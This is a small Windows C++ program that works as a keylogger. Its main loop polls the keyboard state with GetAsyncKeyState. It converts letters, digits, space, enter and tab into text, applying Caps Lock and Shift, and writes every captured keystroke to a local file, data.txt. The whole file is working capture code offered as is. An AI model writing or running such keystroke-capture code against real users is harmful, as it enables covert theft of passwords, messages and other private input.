#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;

string storage;

void log() {
    ofstream data("data.txt", ios::trunc);
    if (data.is_open()) {
        data << storage;
    } else {
        cerr << "Failed to open file!\n";
    }
}

bool handleCapsLock() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

bool handleShift() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
}
void handleBackSpace(){
    if(!storage.empty()){
        storage.pop_back();
    }
    log();
}

string key_to_string(int key) {
    if (key >= 'A' && key <= 'Z') {
        bool caps = handleCapsLock();
        bool shift = handleShift();
        char c = key;
        if (!(caps ^ shift)) {
            c += 32; // to lowercase
        }
        return string(1, c);
    }

    if(key >= '0' && key <= '9'){
        return string(1, char(key));
    }

    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "\n";
        case VK_TAB: return "\t";
        default: return "";
    }
}

int main() {
    while (true) {
        for (int key = 8; key <= 190; ++key) {
            if (GetAsyncKeyState(key) & 0x01) {
                if(key == VK_BACK){
                    handleBackSpace();
                } else {
                    string str = key_to_string(key);
                    if (!str.empty()) {
                    storage += str;
                    log();
                }
                }
            }
        }
        Sleep(10); // 10 miliseconds sleep to prevent high cpu usage
    }
    return 0;
}
